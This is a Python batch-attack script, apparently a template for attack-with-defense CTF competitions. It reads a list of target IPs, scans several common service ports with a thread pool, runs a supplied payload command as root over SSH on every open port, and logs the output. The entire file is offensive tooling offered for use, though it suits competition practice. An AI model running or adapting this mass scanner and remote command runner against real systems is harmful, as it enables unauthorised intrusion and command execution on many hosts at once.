#!/usr/bin/env python3
"""
AWD 攻击脚本模板 - 批量攻击器
用途: 遍历攻击目标机器, 执行 payload
"""

import socket
import subprocess
import sys
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed


class AWDAttacker:
    def __init__(self, targets_file=None, payload=None):
        self.targets = []
        self.payload = payload
        self.results = []
        if targets_file:
            self.load_targets(targets_file)

    def load_targets(self, filename):
        """从文件加载目标 IP 列表"""
        with open(filename, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    self.targets.append(line)
        print(f"[*] 已加载 {len(self.targets)} 个目标")

    def check_port(self, ip, port, timeout=2):
        """检测端口是否开放"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except Exception as e:
            return False

    def exploit(self, ip, port, payload_cmd):
        """执行攻击 payload"""
        try:
            # 示例: 通过 SSH/其他方式执行 payload
            cmd = f"ssh root@{ip} -p {port} '{payload_cmd}' 2>/dev/null"
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=10
            )
            return {
                'ip': ip,
                'port': port,
                'status': 'success' if result.returncode == 0 else 'fail',
                'output': result.stdout,
                'error': result.stderr
            }
        except Exception as e:
            return {'ip': ip, 'port': port, 'status': 'error', 'error': str(e)}

    def mass_attack(self, ports=None, max_workers=20):
        """批量攻击所有目标"""
        if ports is None:
            ports = [22, 80, 443, 3306, 6379, 8080]

        def attack_single(ip):
            results = []
            for port in ports:
                if self.check_port(ip, port):
                    print(f"[+] {ip}:{port} 开放")
                    result = self.exploit(ip, port, self.payload or 'id')
                    results.append(result)
            return results

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(attack_single, ip): ip for ip in self.targets}
            for future in as_completed(futures):
                ip = futures[future]
                try:
                    results = future.result()
                    self.results.extend(results)
                    print(f"[*] {ip} 完成, 发现 {len(results)} 个端口")
                except Exception as e:
                    print(f"[-] {ip} 失败: {e}")

        return self.results

    def save_results(self, output_file):
        """保存攻击结果"""
        with open(output_file, 'w') as f:
            for r in self.results:
                f.write(f"{r}\n")
        print(f"[*] 结果已保存到 {output_file}")


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("用法: python3 awd_attacker.py <targets.txt> [payload_cmd]")
        sys.exit(1)

    targets_file = sys.argv[1]
    payload = sys.argv[2] if len(sys.argv) > 2 else 'id'

    attacker = AWDAttacker(targets_file, payload)
    attacker.mass_attack()
    attacker.save_results('attack_results.txt')
